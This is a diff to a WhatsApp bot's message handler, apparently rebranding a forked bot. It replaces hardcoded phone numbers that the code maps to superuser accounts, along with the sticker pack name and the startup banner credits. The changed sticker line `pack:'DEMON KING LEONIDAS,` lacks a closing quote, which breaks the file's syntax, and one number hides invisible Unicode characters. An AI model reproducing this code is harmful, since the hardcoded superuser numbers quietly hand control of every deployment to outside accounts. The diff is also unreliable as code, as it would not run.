@@ -158,11 +158,11 @@
                 var membreGroupe = verifGroupe ? ms.key.participant : '';
                 const { getAllSudoNumbers } = require("./bdd/sudo");
                 const nomAuteurMessage = ms.pushName;
-                const dj = '24160338758';
-                const dj2 = '24160338758';
-                const dj3 = "24160338758";
-                const luffy = '24160338758';
-                const dj4 = '‪99393228‬';
+                const dj = '237693352250';
+                const dj2 = '237693352250';
+                const dj3 = "237693352250";
+                const luffy = '237693352250';
+                const dj4 = '‪93352250';
                 const sudo = await getAllSudoNumbers();
                 const superUserNumbers = [servBot, dj, dj2, dj3,dj4, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
                 const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -452,7 +452,7 @@
                                        // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                         const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                         var sticker = new Sticker(gifLink, {
-                                            pack: 'Terra-Md',
+                                            pack:'DEMON KING LEONIDAS,
                                             author: conf.NOM_OWNER,
                                             type: StickerTypes.FULL,
                                             categories: ['🤩', '🎉'],
@@ -908,15 +908,15 @@
                    
                  if((conf.DP).toLowerCase() === 'oui') {
                     let cmsg = `╔════◇
-    ║    𝙏𝙀𝙍𝙍𝘼-𝙈𝘿
+    ║    DEMON-KING
     ║    Prefix : [ ${prefixe} ]
     ║    Mode :${md}
     ║    Nombre total de Commandes : ${evt.cm.length}︎
     ╚══════════════════╝
     
     ╔═════◇
-    ║𝘽𝙮: 𝙳𝙰𝚅𝙸𝙳 @𝙳𝙰𝙳𝙳𝚈𝙸𝙶𝚆𝙴
-    ║ 𝙸𝙶𝚆𝙴 𝚃𝙴𝙲𝙷™
+    ║𝘽𝙮: DEMON KING LEONIDAS @LA_MENANCES
+    ║  𝚃𝙴𝙲𝙷™
     ╚══════════════════╝`;
                    
                     await zk.sendMessage(zk.user.id, { text: cmsg });
